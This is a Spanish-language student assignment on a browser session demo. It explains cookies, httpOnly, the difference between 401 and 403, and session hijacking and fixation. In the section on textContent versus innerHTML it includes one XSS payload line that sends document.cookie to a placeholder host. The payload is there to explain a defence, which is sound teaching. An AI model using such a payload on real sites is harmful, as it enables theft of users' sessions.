# Demo de sesiones · Documento de entrega

**Alumno:** Guerrero Castillo Josué
**Materia:** Programación Web · Parcial 3 · semana 12
**Archivo programado:** `base/public/demo.js`

> Todas las respuestas están escritas con lo que se observó en este equipo. Los ids de
> sesión (`I1XBXwMT…`) y las horas cambian en cada corrida; lo que importa es la forma.

---

## 1. Preguntas de preparación (antes de escribir código)

**1. ¿En qué línea se carga `demo.js`? ¿`<head>` o final del `<body>`? ¿Qué cambia eso?**

En la **línea 70**, justo antes de `</body>`. Eso significa dos cosas:

- El navegador ya construyó todo el DOM cuando el script se ejecuta, así que
  `document.getElementById(...)` encuentra todos los elementos y **no hace falta esperar
  `DOMContentLoaded`**.
- No bloquea el dibujado de la página (si estuviera en el `<head>` sin `defer`, el
  navegador detendría el render para descargarlo y ejecutarlo).

**2. Ids de la página y botones con `data-metodo` / `data-url`**

| id | Para qué lo usa `demo.js` |
|---|---|
| `estado` | Texto del estado + clase `con-sesion` / `sin-sesion` |
| `cookie-js` | Lo que devuelve `document.cookie` (o `(vacío)`) |
| `btn-refrescar` | Clic → `refrescarTodo()` |
| `form-login` | `submit` → `POST /api/login` |
| `usuario` | `<select>`: valor del cuerpo + evento `change` |
| `contrasena` | `<input>`: valor del cuerpo |
| `bitacora` | `<ol reversed>` donde se insertan las respuestas |
| `donde` | Texto de dónde viven las sesiones |
| `tabla-sesiones` | `<tbody>` que se reconstruye |
| `btn-sesiones` | Clic → `mostrarTabla()` |
| `config` | `<pre>` con el JSON de `/api/config` |

Botones con `data-metodo` y `data-url` (los cuatro de la tarjeta 3):

| Botón | `data-metodo` | `data-url` |
|---|---|---|
| POST /api/visita | POST | `/api/visita` |
| GET /api/perfil | GET | `/api/perfil` |
| GET /api/admin/reporte | GET | `/api/admin/reporte` |
| POST /api/logout | POST | `/api/logout` |

**3. ¿Quién guarda la cookie y quién la manda?**

El **navegador** en los dos casos. Guarda la cookie en su almacén (Application → Cookies) y
la agrega sola en el encabezado `Cookie:` de cada petición al mismo origen. `demo.js` nunca
la escribe ni la lee: solo llama a la API. (Y con `httpOnly: true`, ni siquiera **puede**
leerla desde JavaScript.)

---

## 2. Preguntas de las etapas

### Etapa 1 · `llamar()`

- **¿Qué encabezado necesita el servidor para que `express.json()` lea el cuerpo?**
  `Content-Type: application/json`. Solo se manda cuando hay cuerpo: en un `GET` no existe
  cuerpo que interpretar.
- **`fetch` no lanza error con 401 o 403. ¿Dónde está el código?** En
  `respuesta.status`. `fetch` solo rechaza la promesa si la petición **no se pudo hacer**
  (sin red, DNS, CORS); un 401, 403 o 500 son respuestas HTTP válidas.
- **¿Qué pasa si la respuesta no es JSON?** `respuesta.json()` lanza `SyntaxError`. Se
  atrapa con `try/catch` y `datos` queda en `null`, para que la página no se caiga.
- **¿Por qué no hace falta `credentials: 'include'`?** Porque `index.html` y la API están
  en el **mismo origen** (`http://localhost:4600`): el navegador manda la cookie por
  defecto. Sí haría falta si la API estuviera en otro puerto o dominio (el caso del
  proyecto de Next.js en `:3000`), y además el servidor tendría que permitirlo con CORS
  (`Access-Control-Allow-Credentials: true` y un origen explícito, no `*`).

### Etapa 2 · Bitácora

- **¿Qué método inserta al principio?** `prepend()` (el `<ol>` además tiene el atributo
  `reversed`, así lo nuevo queda arriba y numerado como el más reciente).
- **¿`textContent` o `innerHTML`?** `textContent`. `innerHTML` interpreta el texto como
  HTML y habilita **XSS**: un nombre como
  `<img src=x onerror="fetch('//malo/'+document.cookie)">` ejecutaría código en la página.
  Si la cookie no fuera `httpOnly`, ese código podría **robar la cookie de sesión** y con
  ella suplantar al usuario.
- **¿Cómo se elige el color?** Con el código: 2xx → `codigo ok`, 401 → `codigo e401`,
  403 → `codigo e403`, cualquier otro → `codigo error` (clases que ya existen en
  `estilos.css`).

### Etapa 3 · Estado

- **¿Por qué `#cookie-js` sale vacío con `httpOnly: true`?** Porque `HttpOnly` le prohíbe
  al motor de JavaScript el acceso a esa cookie; solo viaja en los encabezados HTTP. Sigue
  habiendo sesión, pero la página no puede verla: la única forma de saber quién eres es
  preguntarle al servidor (`GET /api/sesion`). Esa es la prueba P-09.

### Etapa 4 · Tabla

- **¿Cómo se vacía el `<tbody>`?** `cuerpo.textContent = ''` (más simple que
  `while (cuerpo.firstChild) cuerpo.removeChild(...)`).
- **Si no lo vacías:** cada clic **agrega** filas debajo de las anteriores y la tabla se
  duplica (1, 2, 4, 8…). Por eso la prueba pide pulsar "Actualizar tabla" varias veces.
- **ISO → hora local:** `new Date(sesion.expira).toLocaleString()`.
- **¿Celdas con `textContent` o `innerHTML`?** `textContent`, por lo mismo de la etapa 2:
  `usuario` viene de la base de datos y es texto de una persona.

### Etapa 5 · Eventos

- **¿Qué hay que llamar en `submit`?** `evento.preventDefault()`. Sin eso el navegador
  envía el formulario, **recarga la página** y se pierde la bitácora.
- **¿Cómo leer los `data-`?** Con `dataset`: `boton.dataset.metodo` y
  `boton.dataset.url`. Un solo listener para `document.querySelectorAll('button[data-url]')`.
- **¿Conviene `refrescarTodo()`?** Sí: casi toda acción cambia estado **y** tabla (login,
  logout, visita). Con `Promise.all([mostrarEstado(), mostrarTabla()])` se piden las dos en
  paralelo y no se olvida ninguna.
- **¿Qué evento en el `<select>`?** `change` (se dispara al elegir otra opción). `input`
  también sirve, pero se dispara con el teclado y no es lo que queremos aquí.

### Etapa 6 · Arranque

- **¿Por qué no hace falta `DOMContentLoaded`?** Porque el `<script>` está al final del
  `<body>`: cuando se ejecuta, los elementos de arriba ya existen.

---

## 3. Recuadros "Responde" de las pruebas

### P-03 · Credenciales incorrectas

> ¿Por qué es mejor que los dos casos digan exactamente lo mismo?

Porque si "usuario que no existe" y "contraseña incorrecta" dieran mensajes distintos, un
atacante podría **descubrir qué usuarios existen** probando nombres (enumeración de
usuarios) y después concentrar el ataque de diccionario solo en los que sí existen. Mismo
mensaje + mismo `401` = no se filtra nada. (El tiempo de respuesta también debería ser
parecido; por eso `bcrypt.compare` se hace siempre que el usuario existe.)

### P-04 · Login correcto

> ¿La cookie dice "ana" o "alumno"? ¿Dónde están entonces esos datos?

La cookie solo lleva el **id de sesión firmado**, nada más:

```
Set-Cookie: connect.sid=s%3AI1XBXwMTQ6W7zm0oxIijp0hyWhmiJMhS.1Xmrtrh75VOd6UGPx633NNGg3ONMvLBbreZLUl0eq7U; Path=/; Expires=...; HttpOnly; SameSite=Lax
```

Ni "ana" ni "alumno" aparecen ahí. Los datos están **en el servidor**, en la fila de la
tabla `sessions` (columna `data`, con el usuario y el rol en JSON). La cookie es el
"número de ficha": el servidor la busca y encuentra la sesión. Por eso el cliente no puede
cambiar su rol: el id va firmado con el `secret` (HMAC) y, aunque se pudiera falsificar,
el contenido no viaja en la cookie.

### P-11 · Secuestro de sesión

> ¿Qué tres controles limitan el daño de una cookie robada?

1. **`httpOnly`** — el JavaScript de la página no puede leer la cookie, así que un XSS no
   la exfiltra con `document.cookie` (sí evita el robo más común; no evita que la roben
   desde la red o desde el equipo).
2. **`maxAge` corto** — la cookie robada caduca pronto; con `rolling: false` la sesión
   vence a hora fija aunque el atacante la use.
3. **`logout` con `destroy`** — al cerrar sesión el servidor **borra** la sesión del
   almacén: la copia del atacante pasa de `200` a `401`.

Complementos: `sameSite: 'lax'` (la cookie no viaja en POST desde otro sitio),
`secure` + HTTPS (que no la lean en tránsito) y `regenerarAlEntrar` (inutiliza una cookie
plantada antes del login).

### P-12 · Expiración y rolling

> El `Expires` del `Set-Cookie` cambia en cada respuesta. Entonces, ¿quién decide que la
> sesión venció con `rolling: false`: el navegador o tu servidor?

**El servidor.** El `Expires` de la cookie solo le dice al navegador cuándo dejar de
mandarla, y esa decisión es fácil de saltar: `curl` o Postman pueden reenviar la cookie
igual. El que de verdad decide es el servidor: guarda `creada` y `ultimoUso` dentro de la
sesión y en `vencida()` compara `Date.now() - desde > maxAgeMs`. Con `rolling: false` usa
`creada`, así que el contador baja aunque uses la página y a los ~20 s responde
`401 · Tu sesión venció: vuelve a iniciar sesión` y borra la cookie. Con `rolling: true`
usa `ultimoUso`, que se refresca en cada petición: vence solo por inactividad.

### P-13 / P-14 · Fijación de sesión

- **Sin protección (`regenerarAlEntrar: false`)**: el atacante pide una cookie con
  `POST /api/visita`, la planta en la víctima y, cuando ella entra, **el id no cambia**
  (`sesionAntes === sesionDespues`). El atacante ya está dentro como Ana.
- **Con `regenerarAlEntrar: true`**: al entrar, `session.regenerate()` crea un id nuevo
  (`sesionAntes !== sesionDespues`). La cookie vieja del atacante ya no apunta a ninguna
  sesión → `401`.

Diferencia con el secuestro (P-11): en el secuestro el atacante **copia** una cookie que ya
funciona; en la fijación **impone** una cookie que él eligió antes de que la víctima entre.

---

## 4. Tabla de P-08 · 401 contra 403

| Situación | Código | ¿Qué significa? |
|---|---|---|
| Sin sesión | **401** | "No sé quién eres." No hay cookie válida o la sesión venció. La solución es iniciar sesión. |
| Con sesión de ana (alumno) | **403** | "Sé quién eres (Ana), pero no puedes." La identidad sí se reconoce; lo que falta es permiso (rol `alumno`). |
| Con sesión de admin | **200** | `{"reporte":"Talleres: 3 · Inscritos: 57 · Cupo libre: 18"}` |

Mensajes observados:

```
401 → {"error":"401 · No has iniciado sesión (o tu sesión ya venció)"}
403 → {"error":"403 · Eres ana, pero esta ruta es solo para admin"}
200 → {"reporte":"Talleres: 3 · Inscritos: 57 · Cupo libre: 18"}
```

Regla para recordarlo: **401 = autenticación** (quién eres), **403 = autorización** (qué
puedes hacer). El 403 nunca debe usarse para "no hay sesión", porque entonces el cliente no
sabe que tiene que entrar.

---

## 5. Preguntas de cierre

### 1. ¿Qué guarda el navegador y qué guarda el servidor en una sesión? (con P-04)

El **navegador** guarda una sola cosa: `connect.sid` = `s%3A<id>.<firma>`. Es un
identificador opaco y firmado; no dice quién eres. El **servidor** guarda la sesión en la
tabla `sessions` de MySQL: `session_id`, la cookie con su expiración y `data`, un JSON con
`usuario: {id, usuario, nombre, rol}`, `visitas`, `creada` y `ultimoUso`. En P-04 se ve el
`Set-Cookie` saliendo del login y la fila nueva en Workbench: el `session_id` de la fila es
el mismo id que va entre `s%3A` y el punto en la cookie. La cookie es el **número de
ficha**; los datos viven en el servidor.

### 2. `httpOnly` (o `maxAge`/`rolling`, `regenerate`, `logout` con `destroy`): ¿qué ataque evita?

Elijo **`httpOnly`**. Evita que un **XSS** robe la cookie: aunque un atacante logre inyectar
JavaScript en la página, `document.cookie` no incluye `connect.sid`. En P-09, con
`httpOnly: true`, el recuadro muestra `(vacío)` y el `Set-Cookie` trae `HttpOnly`; con
`httpOnly: false`, `document.cookie` muestra `connect.sid=s%3A…` y el `Set-Cookie` ya no
trae el flag. Lo que **no** evita: que roben la cookie por la red o desde el equipo; para
eso están HTTPS/`secure` y `maxAge` corto, y para cortar el daño, `logout` con `destroy`.

### 3. Si el servidor se reinicia o hay dos servidores, ¿por qué conviene MySQL?

Porque la sesión **no vive en el proceso**. Con `almacen: 'memoria'`, al hacer Ctrl+C el
`MemoryStore` desaparece: la cookie sigue en el navegador pero el servidor responde 401
(P-15). Con `almacen: 'mysql'`, al reiniciar el servidor la fila sigue en `sessions` y la
sesión continúa (P-15). Y con **varios servidores** detrás de un balanceador pasa lo mismo:
cada uno tiene su propia memoria, así que la segunda petición puede caer en otro servidor
que no conoce la sesión. Con un almacén compartido (MySQL) cualquiera de los servidores
puede atender cualquier petición, y el `logout`/`destroy` borra la sesión para todos a la
vez.

---

## 6. Lista de cotejo

| Criterio | Estado |
|---|---|
| `demo.js` escrito por el alumno, usando los id de `index.html` sin cambiar el HTML | ✅ |
| `npm run probar` → 21 de 21 | ✅ `21 de 21 pruebas pasaron` |
| La página funciona sin errores en la Consola (estado, bitácora, tabla, configuración) | ✅ verificado con el DOM renderizado |
| `demo.js` usa `textContent` para los datos del servidor | ✅ en `anotar()`, `mostrarEstado()`, `mostrarTabla()`, `mostrarConfig()` |
| Evidencias P-01 a P-16 | carpeta `evidencias/` (ver `LEEME.md`) |
| Explica 401 contra 403 | ✅ tabla de la sección 4 |
| Explica secuestro y fijación, y qué control evita cada uno | ✅ sección 3 (P-11 y P-13/14) |
| Puede explicar cualquier línea del código | ✅ comentarios por función en `demo.js` + sección 2 |
